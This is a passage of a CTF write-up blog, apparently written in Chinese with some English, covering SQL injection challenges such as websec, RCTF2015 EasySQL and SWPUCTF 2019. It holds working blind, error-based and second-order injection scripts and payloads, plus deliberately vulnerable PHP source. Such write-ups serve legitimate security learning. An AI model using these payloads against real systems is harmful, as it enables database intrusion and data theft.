class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">    t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>abs(0x8000000000000000)</code>会爆出数值溢出漏洞, 拿来作为盲注使用</p>
</li>
<li>
<p><code>abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;j})when(0)then(0)else(0x8000000000000000)end)</code>由于字符串的hex串长度必然是偶数, 那么长度可以表述成若干个2的n次方的和, 用<code>{1&lt;&lt;j}</code>将长度中值为1的位慢慢选出来, 最后算出整个长度</p>
</li>
<li>
<p><code>trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)</code>, trim是将第一项中同时也在第二项中的字符去掉</p>
</li>
<li>
<p>然后是通过flaghex化-&gt;hex部分尝试将已知部分hex加上猜测的一位hex置空-&gt;计算长度-&gt;如果长度和之前一样, 那么说明猜测失败, 否则成功</p>
</li>
</ul>
<h2 id="websec-level-4">websec level 4</h2>
<p>the database uses <code>sqlite3</code> instead of <code>mysql</code> ;</p>
<p>Given source codes as follow (leftmost two scripts)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58558693-12748280-8254-11e9-8acb-ba824cb791cd.png" alt="image"></p>
<p>And from the source code , we can recognize the exist of <code>unserialize exploit</code> , so the payload is listed on the buttom, which is generated by the php script on the right.</p>
<blockquote>
<p>In sqlite3 , you can show column_name by &quot;select sql from sqlite_master where tbl_name=‘table_name’ and type=‘table’ &quot;</p>
</blockquote>
<p>by replacing the query 's content to “select password as username from users”, we got a flag</p>
]]></content>
  </entry>
  <entry>
    <title>SQL 题型记录[working forever]</title>
    <url>/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Black-watch-入群题">Black watch 入群题</h2>
<p>盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># if correct , return empty, else return something</span></span><br><span class="line">url = <span class="string">"http://35a2727d-75e8-46cb-84e0-ddc9e31f4a2e.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># [+] --&gt;admin,contents&lt;--</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,title,content,is_enable</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,username,password,is_enable</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># fb7a64bd,dd1d82b3</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># d2276f28,2315045d</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) // <span class="number">2</span></span><br><span class="line">        payload_tmp = payload.format(index, m_bound)</span><br><span class="line">        url_tmp = url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        res = requests.get(url_tmp).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> res:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="comment"># sys.stdout.write("[+] --&gt;%s&lt;--\r" % (result))</span></span><br><span class="line">    <span class="comment"># sys.stdout.flush()</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h2 id="网鼎杯-2018-unfinished">网鼎杯 2018 unfinished</h2>
<p>考察二次注入</p>
<p>注册的时候用到了<code>username</code>, <code>email</code>, <code>password</code>, 然后登录的时候用到了<code>email</code>, <code>password</code>.登录进去之后会显示用户名, 这也是一种可能的二次注入特征, 这道题目的源码中只是对注册用的<code>username</code>做了一些黑名单过滤而没有addslashes, 这就导致sql注入查询出的数据就被插入进数据库中, 登录的时候就可以查看了.</p>
<p>第一个知识点:</p>
<blockquote>
<p>字符串被hex之后会带有数字和字母, 但是将hex串再hex之后就是纯数字了, 但是这样子会很长很长, 导致查询的结果会是用科学计数法表示, 所以需要用substr来截取最后统一解码</p>
</blockquote>
<p>第二个知识点: 数字字符串和数字相加后会有一个类型转换</p>
<p><img src="/images/image-20200109205645682.png" alt="image-20200109205645682"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://4c59ef6a-d690-4b63-9c3d-5ecb1f857679.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_result</span><span class="params">(result)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">r"""&lt;span class="user-name"&gt;\n            (\d+)          &lt;/span&gt;"""</span>)</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># print(type(result))</span></span><br><span class="line">    a = pattern.findall(result.decode(<span class="string">'utf8'</span>))[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(type(a))</span></span><br><span class="line">    hex_num = int(pattern.findall(result.decode(<span class="string">"utf-8"</span>))[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">    result_string = long_to_bytes(hex_num)</span><br><span class="line">    <span class="comment"># print(result_string)</span></span><br><span class="line">    <span class="keyword">return</span> result_string.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(payload)</span>:</span></span><br><span class="line">    email = str(random.randint(<span class="number">0</span>,<span class="number">999</span>))+<span class="string">"@qq.com"</span></span><br><span class="line">    username = <span class="string">"0'+("</span>+payload+<span class="string">")+'0"</span></span><br><span class="line">    password = <span class="string">'200215'</span></span><br><span class="line">    send_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>: email,</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(send_data)</span></span><br><span class="line">    res = requests.post(url+<span class="string">"register.php"</span>, data=send_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> email</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    email = email</span><br><span class="line">    password = <span class="string">'200215'</span></span><br><span class="line">    send_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:email,</span><br><span class="line">        <span class="string">'password'</span>:password</span><br><span class="line">    &#125;</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(send_data)</span></span><br><span class="line">    res = requests.post(url+<span class="string">'login.php'</span>, data=send_data, headers=header, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_payload</span><span class="params">(payload)</span>:</span></span><br><span class="line">    email = register(payload)</span><br><span class="line">    <span class="comment"># print(email)</span></span><br><span class="line">    result_content = login(email)</span><br><span class="line">    result_string = find_result(result_content)</span><br><span class="line">    <span class="keyword">return</span> result_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    payload_mod = <span class="string">"select substr(hex(hex((select * from flag)))from &#123;0&#125; for 10)"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">900</span>,<span class="number">10</span>):</span><br><span class="line">        payload = payload_mod.format(i)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        flag += handle_payload(payload)</span><br><span class="line">        flag_num = int(flag, <span class="number">16</span>)</span><br><span class="line">        result = long_to_bytes(flag_num)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        sys.stdout.write(<span class="string">"[+] %s\r"</span> % (result))</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>
<p>注意</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select hex(hex(select username from users)); 这条语句新版本已经不能用了, 我测的是10.3.20-MariaDB-1</span><br><span class="line">select hex(hex(username)) from users; 这条还可以用</span><br></pre></td></tr></table></figure>
<p>当然盲注也可以, 语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;and((select substr((%s)from(%d)for(1))=&apos;%s&apos;))and&apos;1</span><br></pre></td></tr></table></figure>
<h2 id="RCTF2015-EasySQL">[RCTF2015]EasySQL</h2>
<p>考察二次注入</p>
<p>开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的<code>mid, substr, and,空格, /**/</code>等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1);#</span><br></pre></td></tr></table></figure>
<p>查users这个表, 但是默认会查到系统自带的, 再增加一个条件就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)&amp;&amp;(table_schema=database()),0x7e),1);#</span><br></pre></td></tr></table></figure>
<p>就可以知道列名.</p>
<p>尝试查询, 发现很多项的内容都是xxx, 但是substr又不能用, 就用条件判断好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br><span class="line"></span><br><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br></pre></td></tr></table></figure>
<h2 id="实验课遇见的题目">实验课遇见的题目</h2>
<p>语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;</span><br></pre></td></tr></table></figure>
<p>双参数注入, 要求返回结果不为空</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=or(1)#\</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-Final-SQL">极客大挑战 Final SQL</h2>
<p>过滤了很多, 然后在id处测出了异或注入.</p>
<p>过滤了空格和星号, 用括号绕过, 然后注, 读flag表:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png" alt="image"></p>
<p>怎么这么多垃圾数据? 倒过来读一下看吧</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png" alt="image"></p>
<p>👴哭了</p>
<p>去读另一张表了, 这次还是从最后一位往前读</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090386-de57b380-21dd-11ea-8bcb-220f4ffbaf93.png" alt="image"></p>
<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database()))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#  url = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('Flaaaaag'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#  url_tmp = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('F1naI1y'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))".format(index, m_bound)</span></span><br><span class="line">        url_tmp = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  url_tmp = url.format(index, m_bound)</span></span><br><span class="line">        res = requests.get(url_tmp).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> res:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">    result = chr(tmp) + result</span><br><span class="line">    print(result)</span><br><span class="line">    index -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="XDCTF-2015-filemanager">XDCTF  2015 filemanager</h2>
<p>提供了文件上传, 删除和改名的功能, 有源码泄露, 删除功能没什么用, 其他关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.inc.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>($_GET, $_POST, $_COOKIE) <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES) &#123;</span><br><span class="line">	$file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">	<span class="keyword">if</span> ($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">		$name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">		$path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts["filename"] = $db-&gt;quote($path_parts["filename"]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		$path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">		$sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">		$fetch = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($fetch-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (move_uploaded_file($file[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">			$sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">			$re = $db-&gt;query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">				print_r($db-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		print_r(error_get_last());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rename.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($result) &#123;</span><br><span class="line"></span><br><span class="line">		$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">		$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">		<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">			print_r($db-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">			rename($oldname, $newname);</span><br><span class="line">		&#125;</span><br><span class="line">		$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件上传的时候都经过了addslash, 改名字阶段从数据库中取出原本的数据不经过addslashes后直接拼进了查询语句中, 导致二次注入.</p>
<p>改名操作是新文件名和原文件扩展名拼接, 可以在二次注入的时候将原文件扩展名置空, 这样数据库中二次注入完之后就filename=x.jpg, extension=’’, 这样就可以直接上传x.jpg后改名成php了.</p>
<h2 id="facebook-ctf-2019-product-manager">facebook ctf 2019 product manager</h2>
<p>buu上的这题有点问题, 没有flag. 所以自己起了一个然后复现, 主界面如下</p>
<p><img src="C:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191216152057800.png" alt="image-20191216152057800"></p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('messenger', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('instagram', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    ...... </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag在facebook项中, 同时, 代码逻辑不允许插入同名项, 但是get_product仅仅从名字来选择项, 但是select 的特性是忽略末尾的空格, 如果插入一条名字叫做<code>facebook      {几个空格}</code>的项目的话, 在查询<code>Facebook</code>, 并且用facebook{空格}插入时候的密码来验证的话是可以验证通过的,  结果就会查询出两个, 一个是真正的facebook另一个是我们插入的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886814-6344a080-2017-11ea-8a04-415a612ee2ab.png" alt="image"></p>
<p>查询facebook, 密码是一开始的密码</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886862-82433280-2017-11ea-955d-98e9eccec93b.png" alt="image"></p>
<h2 id="swpuctf-2019-web1">swpuctf 2019 web1</h2>
<p>这题考察二次注入,  题目里面是一个广告发布页面, 点击申请广告后添加标题等广告信息之后回到首页点击广告详情就能触发二次注入漏洞, 一开始申请广告的时候应该是转义之后的字符串被加入数据库中, 第二次给我的感觉是通过id来查询出title然后用没有addslash过的title又去执行了其他sql语句, 或许是查询content和ac? 感觉怪怪的.总之payload如下(22列真的狠).</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391534-502b4280-1a11-11ea-9761-3c0c2754fb47.png" alt="image"></p>
<p>其实正解是通过sys.schema_index_statistics找到table_name, 然后无列名注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title=hhhh&apos;/**/union/**/select/**/1,(select/**/group_concat(q)/**/from/**/(select/**/ 1,2,3&apos;q&apos;/**/union/**/select/**/*/**/from/**/users)m),&apos;222&apos;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22||&apos;&amp;content=hello&amp;ac=add</span><br></pre></td></tr></table></figure>
<h2 id="swpuctf-2019-web4">swpuctf 2019 web4</h2>
<p>考察堆叠注入,开局登录界面, 让username等于单引号500, 让username等于<code>and'</code> 200, 换成<code>an'</code> 又是500, 可见这个回显不正常, 很有可能是and被过滤了, 再测试一下其他的关键字的确被过滤了很多包括select 和concat, 采用预编译堆叠注入 , 脚本如下:</p>
